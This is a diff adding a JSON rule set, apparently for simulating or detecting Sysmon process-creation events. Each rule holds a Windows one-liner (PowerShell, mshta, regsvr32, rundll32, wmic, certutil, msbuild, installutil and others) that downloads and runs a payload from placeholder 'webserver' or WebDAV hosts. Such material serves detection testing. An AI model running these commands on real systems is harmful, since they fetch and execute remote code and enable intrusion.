@@ -1,0 +1,188 @@
+{
+  "name": "Windows oneliners",
+  "version": "0.1",
+  "author": "n0dec",
+  "description": "Windows oneliners to download remote payload and execute arbitrary code. https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/",
+  "rules": {
+	"powershell_inline": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Powershell one command line download using proxy credentials.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+		"CommandLine": "powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\""
+      }
+    },
+	"powershell_webdav": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Powershell download payload directly from a WebDAV server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+		"CommandLine": "powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1"
+      }
+    },
+	"cmd": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Cmd executing batch file from a WebDAV server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\cmd.exe",
+		"CommandLine": "cmd.exe /k < \\\\webdavserver\\folder\\batchfile.txt"
+      }
+    },
+	"cscript": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Cscript one command line for download payload directly from a WebDAV server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\cscript.exe",
+		"CommandLine": "cscript //E:jscript \\\\webdavserver\\folder\\payload.txt"
+      }
+    },
+	"mshta_inline": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Mshta execute inline script downloaded from remote server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\mshta.exe",
+		"CommandLine": "mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\")\"))"
+      }
+    },
+	"mshta_remote": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Mshta execute hta file downloaded from remote server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\mshta.exe",
+		"CommandLine": "mshta http://webserver/payload.hta"
+      }
+    },
+	"mshta_webdav": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Mshta execute hta file downloaded from WebDAV server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\mshta.exe",
+		"CommandLine": "mshta \\\\webdavserver\\folder\\payload.hta"
+      }
+    },
+	"rundll32_webdav": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Rundll32 execute dll file downloaded from WebDAV server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\rundll32.exe",
+		"CommandLine": "rundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint"
+      }
+    },
+	"rundll32_inline": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Rundll32 execute inline jscript downloaded from remote server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\rundll32.exe",
+		"CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\");window.close();"
+      }
+    },
+	"wmic": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "WMIC inline script via XSL file downloaded from remote server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+		"CommandLine": "wmic os get /format:\"https://webserver/payload.xsl\""
+      }
+    },
+	"regasm": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Regasm execute dll file downloaded from remote WebDAV server.",
+      "payload": {
+		"Image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe",
+		"CommandLine": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /u \\\\webdavserver\\folder\\payload.dll"
+      }
+    },
+	"regsvr32_inline": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Regsvr32 execute inline script downloaded from remote server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\regsvr32.exe",
+		"CommandLine": "regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll"
+      }
+    },
+	"regsvr32_webdav": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Regsvr32 execute inline script downloaded from remote WebDAV server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\regsvr32.exe",
+		"CommandLine": "regsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll"
+      }
+    },
+	"odbcconf": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Odbcconf execute dll file downloaded from remote server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\regsvr32.exe",
+		"CommandLine": "odbcconf /s /a {regsvr \\\\webdavserver\\folder\\payload_dll.txt}"
+      }
+    },
+	"msbuild": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "MSBuild execute inline code downloaded from remote server.",
+      "payload": {
+		"Image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+		"CommandLine": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe /noautoresponse /preprocess \\\\webdavserver\\folder\\payload.xml"
+      }
+    },
+	"certutil_download": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Certutil download file from remote server.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\certutil.exe",
+		"CommandLine": "certutil -urlcache -split -f http://webserver/payload payload"
+      }
+    },
+	"certutil_decode": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "Certutil decode file and drop it as payload.",
+      "payload": {
+		"Image": "C:\\Windows\\System32\\certutil.exe",
+		"CommandLine": "certutil -decode payload.b64 payload.dll"
+      }
+    },
+	"installutil": {
+      "enabled": true,
+      "source": "Sysmon",
+      "category": "Process Create",
+      "description": "InstallUtil execute dll file as a payload.",
+      "payload": {
+		"Image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+		"CommandLine": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll"
+      }
+    }	
+  }
+}
